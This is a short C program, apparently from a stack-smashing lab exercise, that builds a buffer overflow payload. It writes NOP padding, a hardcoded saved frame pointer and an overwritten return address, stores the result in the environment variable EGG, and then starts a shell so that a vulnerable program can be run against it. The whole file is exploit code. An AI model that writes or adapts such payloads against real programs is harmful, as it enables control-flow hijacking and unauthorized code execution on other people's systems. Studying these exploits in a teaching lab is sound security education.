#include <stdlib.h>
#include <string.h>

#define NOP 0x90
#define SFP_OFFSET 28
#define SFP "\x98\xf6\xff\xbf"
#define NEW_RET "\xa4\x85\x04\x08"

void main() {
    // Create the overflow string:
    char buffer[SFP_OFFSET + sizeof(int*) * 2 + 1];
    memset(buffer, NOP, SFP_OFFSET);
    strncpy(buffer + SFP_OFFSET, SFP, sizeof(int*));
    strncpy(buffer + SFP_OFFSET + sizeof(int*), NEW_RET, sizeof(int*));
    buffer[SFP_OFFSET + sizeof(int*) * 2] = '\0';

    // Make it an environment variable:
    setenv("EGG", buffer, 1);
    system("/bin/sh");
}
